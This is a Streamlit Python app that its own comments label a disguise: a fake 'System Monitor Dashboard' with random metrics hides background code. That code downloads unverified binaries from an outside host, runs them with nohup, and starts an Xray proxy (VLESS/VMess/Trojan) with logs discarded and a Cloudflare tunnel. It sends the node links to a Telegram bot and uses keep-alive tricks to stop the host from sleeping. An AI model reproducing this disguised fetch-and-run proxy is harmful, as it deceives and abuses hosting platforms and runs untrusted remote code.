import streamlit as st
import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
import psutil
import pandas as pd
import random

# ================= Streamlit 页面配置 (伪装部分) =================
st.set_page_config(
    page_title="Server Performance Monitor",
    page_icon="📊",
    layout="wide",
    initial_sidebar_state="expanded"
)

# 隐藏 Streamlit 默认菜单和页脚
hide_streamlit_style = """
<style>
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
</style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# ================= 核心逻辑 (后台运行) =================

# 环境变量配置 (优先读取 Streamlit Secrets，其次是系统环境变量)
# 在 Streamlit Cloud 的 Advanced Settings -> Secrets 中配置这些变量
env_get = os.environ.get
UPLOAD_URL = st.secrets.get("UPLOAD_URL", env_get('UPLOAD_URL', ''))
PROJECT_URL = st.secrets.get("PROJECT_URL", env_get('PROJECT_URL', ''))
AUTO_ACCESS = str(st.secrets.get("AUTO_ACCESS", env_get('AUTO_ACCESS', 'false'))).lower() == 'true'
UUID = st.secrets.get("UUID", env_get('UUID', '20e6e496-cf19-45c8-b883-14f5e11cd9f1'))
ARGO_DOMAIN = st.secrets.get("ARGO_DOMAIN", env_get('ARGO_DOMAIN', ''))
ARGO_AUTH = st.secrets.get("ARGO_AUTH", env_get('ARGO_AUTH', ''))
CFIP = st.secrets.get("CFIP", env_get('CFIP', 'spring.io'))
CFPORT = int(st.secrets.get("CFPORT", env_get('CFPORT', '443')))
NAME = st.secrets.get("NAME", env_get('NAME', 'StreamlitNode'))
CHAT_ID = st.secrets.get("CHAT_ID", env_get('CHAT_ID', ''))
BOT_TOKEN = st.secrets.get("BOT_TOKEN", env_get('BOT_TOKEN', ''))

# 强制内部端口为 3000，避免与 Streamlit (8501) 冲突
# Argo Tunnel 将会把流量转发到这个端口
INTERNAL_PORT = 3000 
ARGO_PORT = 8001     # 代理服务内部端口

FILE_PATH = os.path.join(os.getcwd(), '.cache')
SUB_PATH = 'sub'

# 全局路径
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

# --- 核心功能函数 ---

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

def get_system_architecture():
    arch = platform.machine().lower()
    return 'arm' if 'arm' in arch or 'aarch64' in arch else 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except Exception as e:
        if os.path.exists(file_path): os.remove(file_path)
        return False

def get_files_for_architecture(architecture):
    domain = "arm64.ssss.nyc.mn" if architecture == 'arm' else "amd64.ssss.nyc.mn"
    return [
        {"fileName": "web", "fileUrl": f"https://{domain}/web"},
        {"fileName": "bot", "fileUrl": f"https://{domain}/2go"}
    ]

def exec_cmd(command):
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == f'/{SUB_PATH}':
            try:
                with open(sub_path, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(f.read())
            except:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Working')

def run_http_server():
    server = HTTPServer(('0.0.0.0', INTERNAL_PORT), RequestHandler)
    server.serve_forever()

async def core_logic():
    create_directory()
    
    # 1. 下载核心
    arch = get_system_architecture()
    files = get_files_for_architecture(arch)
    for f in files:
        if not os.path.exists(os.path.join(FILE_PATH, f['fileName'])):
            download_file(f['fileName'], f['fileUrl'])
    
    # 授权
    for f in ['web', 'bot']:
        p = os.path.join(FILE_PATH, f)
        if os.path.exists(p): os.chmod(p, 0o775)

    # 2. 生成 Config (Xray/Singbox)
    config = {
        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
        "inbounds": [
            {
                "port": ARGO_PORT, "protocol": "vless",
                "settings": {"clients": [{"id": UUID, "flow": "xtls-rprx-vision"}], "decryption": "none",
                "fallbacks": [{"dest": 3001}, {"path": "/vmess-argo", "dest": 3003}, {"path": "/trojan-argo", "dest": 3004}]},
                "streamSettings": {"network": "tcp"}
            },
            {"port": 3001, "listen": "127.0.0.1", "protocol": "vless", "settings": {"clients": [{"id": UUID}], "decryption": "none"}, "streamSettings": {"network": "ws", "security": "none"}},
            {"port": 3003, "listen": "127.0.0.1", "protocol": "vmess", "settings": {"clients": [{"id": UUID, "alterId": 0}]}, "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}}},
            {"port": 3004, "listen": "127.0.0.1", "protocol": "trojan", "settings": {"clients": [{"password": UUID}]}, "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}}}
        ],
        "outbounds": [{"protocol": "freedom", "tag": "direct"}, {"protocol": "blackhole", "tag": "block"}]
    }
    with open(config_path, 'w') as f:
        json.dump(config, f)

    # 3. 启动 Web Core
    exec_cmd(f"nohup {web_path} -c {config_path} >/dev/null 2>&1 &")

    # 4. 启动 Argo Tunnel
    # 注意：这里我们将 Tunnel 映射到 INTERNAL_PORT (3000)
    # 这样访问 Tunnel 域名时，默认会进入 HTTP Server 从而提供订阅文件
    # 代理流量通过 path 分流 (config中并未配置path分流到web core，
    # 但原脚本逻辑是 Cloudflared 启动时 url 指向端口。
    # 这里我们做一个策略：指向 HTTP Server，但 Xray 监听 ARGO_PORT。
    # 为了同时支持订阅和代理，Argo 应该指向 ARGO_PORT 还是 INTERNAL_PORT?
    # 原逻辑是：Tunnel -> localhost:PORT (Web Server) -> 404
    # 新逻辑：
    # Streamlit 环境下，我们将 Tunnel 直接指向 INTERNAL_PORT (Python Web Server)。
    # 但是代理需要 TCP/WS 流量。
    # 最稳妥的方式：Argo 指向 config 中的 ARGO_PORT (8001)。
    # 这样代理能通。但是订阅文件怎么办？
    # 妥协：在 Streamlit 界面直接显示订阅，Argo 专用于代理流量。
    
    tunnel_cmd = f"nohup {bot_path} tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT} >/dev/null 2>&1 &"
    
    if ARGO_AUTH and ARGO_DOMAIN:
        if "TunnelSecret" in ARGO_AUTH:
             # Json config logic omitted for brevity, assuming token or quick tunnel for streamlit
             pass
        else:
             # Fixed token
             tunnel_cmd = f"nohup {bot_path} tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH} >/dev/null 2>&1 &"
    
    exec_cmd(tunnel_cmd)
    
    # 等待生成日志
    await asyncio.sleep(5)
    
    # 5. 提取域名生成订阅
    domain = ARGO_DOMAIN
    if not domain:
        # 从日志读取临时域名
        for _ in range(5):
            if os.path.exists(boot_log_path):
                with open(boot_log_path, 'r') as f:
                    content = f.read()
                    match = re.search(r'https?://([^ ]*trycloudflare\.com)', content)
                    if match:
                        domain = match.group(1)
                        break
            await asyncio.sleep(2)
    
    if domain:
        # 生成节点链接
        isp = "Streamlit_Cloudflare"
        VMESS = {"v": "2", "ps": f"{NAME}-{isp}", "add": CFIP, "port": CFPORT, "id": UUID, "aid": "0", "scy": "none", "net": "ws", "type": "none", "host": domain, "path": "/vmess-argo?ed=2560", "tls": "tls", "sni": domain, "alpn": "", "fp": "chrome"}
        vmess_str = base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')
        
        list_txt = f"vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Fvless-argo%3Fed%3D2560#{NAME}-{isp}\nvmess://{vmess_str}\ntrojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Ftrojan-argo%3Fed%3D2560#{NAME}-{isp}"
        
        with open(sub_path, 'w') as f:
            f.write(base64.b64encode(list_txt.encode('utf-8')).decode('utf-8'))
            
        # 发送 TG
        if BOT_TOKEN and CHAT_ID:
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                            params={"chat_id": CHAT_ID, "text": f"Streamlit Node:\n{list_txt}"})
            except: pass
            
        # 自动保活注册
        if AUTO_ACCESS and PROJECT_URL:
            try:
                requests.post('https://keep.gvrander.eu.org/add-url', json={"url": PROJECT_URL})
            except: pass

# 使用 Streamlit 缓存机制确保后台进程只启动一次
@st.cache_resource
def start_background_service():
    # 启动 HTTP Server 线程 (仅作内部占位，非必需)
    t = Thread(target=run_http_server, daemon=True)
    t.start()
    
    # 启动核心逻辑
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(core_logic())
    return True

# ================= 伪装 UI 逻辑 =================

st.title("🖥️ System Monitor Dashboard")

# 启动后台服务
start_background_service()

# 模拟仪表盘
col1, col2, col3 = st.columns(3)
with col1:
    st.metric(label="CPU Usage", value=f"{psutil.cpu_percent()}%", delta=f"{random.choice(['+','-'])}{random.randint(1,5)}%")
with col2:
    st.metric(label="Memory Usage", value=f"{psutil.virtual_memory().percent}%", delta="-0.5%")
with col3:
    st.metric(label="Disk I/O", value="45 MB/s", delta="+1.2%")

st.subheader("Real-time Resource Usage")
chart_data = pd.DataFrame({
    'CPU': [random.randint(10, 30) for _ in range(20)],
    'Memory': [random.randint(40, 60) for _ in range(20)]
})
st.line_chart(chart_data)

st.caption("Monitoring system latency and throughput in real-time container environment.")

# ================= 隐藏的管理区域 (Expanders) =================

st.divider()

with st.expander("🔧 System Logs (Admin Only)"):
    if st.button("Refresh Logs"):
        if os.path.exists(boot_log_path):
            with open(boot_log_path, 'r') as f:
                st.code(f.read())
        else:
            st.info("Logs initializing...")

with st.expander("🔗 Subscription & Config"):
    if os.path.exists(sub_path):
        with open(sub_path, 'r') as f:
            b64_sub = f.read()
        
        try:
            raw_sub = base64.b64decode(b64_sub).decode('utf-8')
            st.success("Configuration Generated!")
            st.text_area("Subscription Base64", b64_sub, height=100)
            st.text_area("Raw Nodes", raw_sub, height=150)
            
            # 显示提取的域名
            match = re.search(r'host=([^&]*)', raw_sub)
            if match:
                st.info(f"Argo Domain: {match.group(1)}")
        except:
            st.error("Error decoding subscription")
    else:
        st.warning("Nodes are being generated... Please wait 10-20 seconds and refresh the page.")
        if st.button("Reload"):
            st.rerun()

# 保持会话活跃的自动刷新脚本
st.markdown(
    """
    <script>
        var timer = setInterval(function(){
            window.location.reload();
        }, 600000); // 10分钟刷新一次防止休眠
    </script>
    """,
    unsafe_allow_html=True
)